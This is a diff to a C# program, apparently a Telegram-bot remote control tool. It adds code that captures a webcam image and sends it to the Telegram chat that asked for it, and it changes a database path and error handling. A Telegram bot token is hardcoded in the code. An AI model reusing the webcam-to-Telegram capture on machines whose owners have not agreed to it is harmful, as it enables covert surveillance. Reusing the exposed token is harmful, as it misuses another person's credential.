@@ -51,7 +51,7 @@ namespace CONTROLL
     internal class Program
     {
         public static int status;
-        static string connectionString = @"Data Source=(LocalDB)\MSSQLLocalDB;AttachDbFilename=""D:\C# proect\CONTROL\db.mdf"";Integrated Security=True";
+        static string connectionString = @"Data Source=(LocalDB)\MSSQLLocalDB;AttachDbFilename=""D:\C# proect\CONTROL\DataBase\db.mdf"";Integrated Security=True";
         static SqlConnection sql = new SqlConnection(connectionString);
 
         static ITelegramBotClient bot = new TelegramBotClient("6120629335:AAF8ERXPC7rCzWccZbKwi1WxODAzqBPObx8");
@@ -505,6 +505,25 @@ namespace CONTROLL
                         {
                             VideoCapture capture = new VideoCapture(); //create a camera capture
 
+                            string WebScreenShotName = "WebScreenShot.png";
+                            Bitmap image = null;
+                            for (int i = 0; i < 2; i++)
+                            {
+                                image = capture.QueryFrame().Bitmap;
+
+
+                            }
+                            capture.Dispose();
+                            image.Save(WebScreenShotName, ImageFormat.Png);
+
+                            await botClient.SendPhotoAsync(chatId: message.Chat.Id, photo: System.IO.File.Open(WebScreenShotName, System.IO.FileMode.Open));
+
+
+
+
+                            /*
+                            VideoCapture capture = new VideoCapture(); //create a camera capture
+
                             //Bitmap image = capture.QueryFrame().Bitmap; //take a picture
                             Bitmap image = capture.QueryFrame().Bitmap; //take a picture
 
@@ -513,6 +532,7 @@ namespace CONTROLL
                             var update_image = new SetBrightness(image, 1.300f, 1.0f, 1.280f, WebScreenShotName);
                             capture.Dispose();
                             await botClient.SendPhotoAsync(chatId: message.Chat.Id, photo: System.IO.File.Open(WebScreenShotName, System.IO.FileMode.Open));
+                            */
                             return;
                         }
 
@@ -595,6 +615,7 @@ namespace CONTROLL
         {
             // Некоторые действия
             Console.WriteLine(Newtonsoft.Json.JsonConvert.SerializeObject(exception));
+            MessageBox.Show(Convert.ToString(Newtonsoft.Json.JsonConvert.SerializeObject(exception)), "Error");
             //Console.WriteLine(exception);
         }
 
